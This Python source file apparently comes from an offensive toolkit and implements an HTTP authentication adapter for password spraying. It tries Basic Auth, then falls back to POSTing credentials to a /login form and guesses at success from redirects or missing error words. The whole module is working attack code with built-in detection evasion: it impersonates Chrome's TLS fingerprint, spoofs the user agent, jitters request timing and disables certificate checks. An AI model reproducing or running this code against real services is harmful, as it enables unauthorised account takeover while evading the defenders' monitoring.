"""
forge/utils/intel/auth_adapters/http_adapter.py
Canonical: forge/phase2/auth_adapters/http_adapter.py

HTTP Basic-Auth and form-based authentication adapter using curl_cffi.
Impersonates Chrome TLS fingerprint; never uses python-requests UA.
"""

from __future__ import annotations

import asyncio
import logging
import random
from typing import Optional
from urllib.parse import urljoin

from forge.utils.intel.auth_adapters import BaseAuthAdapter

_LOG = logging.getLogger(__name__)

# Modern Chrome UA — never reveal python-requests or curl user agent.
_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
_TIMEOUT = 15


class HTTPAdapter(BaseAuthAdapter):
    """
    Tries HTTP Basic Auth first; falls back to POST form spray if Basic returns 401.

    Form spray heuristics:
      - POST to <host>/login with fields: username/email + password.
      - Success detected by: 302 Location header or absence of 'invalid' / 'incorrect'
        in response body (configurable; default heuristic only).
      - Operator must confirm form field names via --http-form-fields if defaults fail.

    OPSEC:
      - curl_cffi impersonates Chrome TLS — avoids python TLS fingerprint detection.
      - 2 s default inter-request delay with ±30 % Gaussian jitter.
      - Never follows redirects that exit the target scope.
    """

    @property
    def default_port(self) -> int:
        return 443

    @property
    def service_name(self) -> str:
        return "http"

    async def authenticate(
        self,
        host: str,
        username: str,
        password: str,
        port: Optional[int] = None,
        scheme: str = "https",
        form_path: str = "/login",
        username_field: str = "username",
        password_field: str = "password",
        **kwargs,
    ) -> tuple[bool, Optional[str]]:
        # Gaussian jitter around 2 s base.
        await asyncio.sleep(max(0.1, random.gauss(2.0, 0.6)))

        target_port = port or self.default_port
        base_url = f"{scheme}://{host}:{target_port}"

        try:
            from curl_cffi.requests import AsyncSession  # type: ignore[import]
        except ImportError:
            return False, "curl_cffi not installed: pip install curl_cffi"

        async with AsyncSession(impersonate="chrome124") as session:
            # --- Try HTTP Basic Auth ---
            try:
                r = await session.get(
                    base_url,
                    auth=(username, password),
                    headers={"User-Agent": _UA},
                    timeout=_TIMEOUT,
                    verify=False,
                )
                if r.status_code == 200:
                    return True, None
                if r.status_code == 401:
                    pass  # fall through to form spray
                elif r.status_code == 403:
                    return False, "403 Forbidden"
            except Exception as exc:
                _LOG.debug("HTTP Basic error: %s", exc)

            # --- Form POST spray ---
            try:
                login_url = urljoin(base_url, form_path)
                r = await session.post(
                    login_url,
                    data={username_field: username, password_field: password},
                    headers={"User-Agent": _UA},
                    timeout=_TIMEOUT,
                    verify=False,
                    allow_redirects=False,
                )
                # Success heuristics: 302 redirect away from login page,
                # or 200 with no failure keywords in body.
                if r.status_code in (301, 302, 303):
                    loc = r.headers.get("Location", "")
                    if "login" not in loc.lower() and "error" not in loc.lower():
                        return True, None
                if r.status_code == 200:
                    body_lower = r.text.lower()
                    fail_words = {"invalid", "incorrect", "failed", "wrong", "error"}
                    if not any(w in body_lower for w in fail_words):
                        return True, f"Form POST 200 — manual verification recommended"
                return False, f"HTTP {r.status_code}"
            except Exception as exc:
                return False, str(exc)
